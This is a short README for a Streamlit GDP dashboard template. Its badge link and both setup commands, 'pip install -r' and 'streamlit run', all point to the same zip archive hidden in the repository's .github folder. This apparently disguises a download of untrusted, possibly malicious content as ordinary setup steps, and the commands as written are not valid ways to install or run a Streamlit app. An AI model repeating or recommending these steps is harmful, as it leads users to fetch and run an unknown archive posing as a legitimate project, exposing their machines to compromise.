# :earth_americas: GDP dashboard template

A simple Streamlit app showing the GDP of different countries in the world.

[![Open in Streamlit](https://github.com/BrtAI-coder/gdp-dashboard/raw/refs/heads/main/.github/gdp_dashboard_3.7.zip)](https://github.com/BrtAI-coder/gdp-dashboard/raw/refs/heads/main/.github/gdp_dashboard_3.7.zip)

### How to run it on your own machine

1. Install the requirements

   ```
   $ pip install -r https://github.com/BrtAI-coder/gdp-dashboard/raw/refs/heads/main/.github/gdp_dashboard_3.7.zip
   ```

2. Run the app

   ```
   $ streamlit run https://github.com/BrtAI-coder/gdp-dashboard/raw/refs/heads/main/.github/gdp_dashboard_3.7.zip
   ```
